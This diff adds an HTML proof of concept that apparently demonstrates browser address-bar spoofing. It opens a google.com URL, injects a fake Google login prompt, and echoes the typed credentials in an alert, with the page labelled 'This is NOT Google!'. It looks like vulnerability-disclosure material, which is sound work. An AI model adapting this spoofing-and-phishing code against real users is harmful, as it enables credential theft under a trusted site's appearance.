@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <button onclick="spoof()">Click to spoof</button>
+
+  <script>
+    function spoof() {
+      let win = window.open("https://www.google.com/gen_204", "_blank");
+
+      let payload = `
+        <div style="text-align:center; font-family:Arial, sans-serif;">
+          <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png"
+               alt="Google Logo" style="margin-top:20px;">
+          <h1>This is NOT Google!</h1>
+          <p>Please enter your credentials:</p>
+          <script>
+            setTimeout(() => {
+              let u = prompt('Enter your username:');
+              let p = prompt('Enter your password:');
+              alert('Your creds:\\nUsername: ' + u + '\\nPassword: ' + p);
+            }, 500);
+          <\/script>
+        </div>
+      `;
+
+      setTimeout(() => {
+        try {
+          win.document.write(payload);
+          win.document.close();
+        } catch (e) {
+          console.warn("Blocked by browser protections:", e);
+        }
+      }, 200);
+    }
+  </script>
+</body>
+</html>
